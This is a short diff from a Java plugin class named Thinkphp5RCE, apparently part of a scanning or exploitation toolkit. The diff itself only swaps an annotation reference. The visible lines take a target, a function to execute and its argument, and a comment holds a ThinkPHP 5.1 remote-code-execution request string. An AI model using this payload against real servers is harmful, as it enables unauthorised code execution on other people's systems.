@@ -20,7 +20,7 @@ import java.util.Map;
                 @Param(key = "target", desc = "目标地址"),
                 @Param(key = "func",defaultValue = "phpinfo" , desc = "执行函数"),
                 @Param(key = "var",defaultValue = "1" , desc = "函数参数"),
-                },type = AbstractPlugin.Type.HTML )
+                },type = CommonPlugin.Type.HTML )
 public class Thinkphp5RCE extends CommonPlugin<String>{
     /** 5.1
      * s=index/\think\Request/input&filter=phpinfo&data=1
